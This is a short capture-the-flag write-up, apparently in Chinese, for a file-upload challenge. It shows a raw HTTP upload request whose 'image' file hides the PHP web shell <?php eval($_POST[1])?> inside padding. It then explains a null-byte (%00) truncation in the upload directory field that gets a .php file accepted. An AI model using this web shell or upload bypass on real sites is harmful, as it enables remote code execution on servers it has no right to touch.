POST /web/upload/upload.php HTTP/1.1
Host: ctf4.shiyanbar.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf4.shiyanbar.com/web/upload/
Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1470662810,1470662877,1470699450; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*63018%2CnickName%3AAl0an; PHPSESSID=6q11eife8st6n5d655ol8phmt1; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1470703774; ASPSESSIONIDSCRSAACT=HLKHIDFAGHDDOIFDFHDOPDLI
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------21047821051793278241052893351
Content-Length: 1975

-----------------------------21047821051793278241052893351
Content-Disposition: form-data; name="dir"

/uploads/
-----------------------------21047821051793278241052893351
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: image/jpeg

111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111<?php eval($_POST[1])?>11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111111
-----------------------------21047821051793278241052893351
Content-Disposition: form-data; name="submit"

Submit
-----------------------------21047821051793278241052893351--

重点看这里：

Content-Disposition: form-data; name="dir"

这里是网站的上传目录，我们可以在这里动手脚，把

/uploads/

在hex处改成

/uploads/1.php00

对%00编码，即可上传成功，得到flag

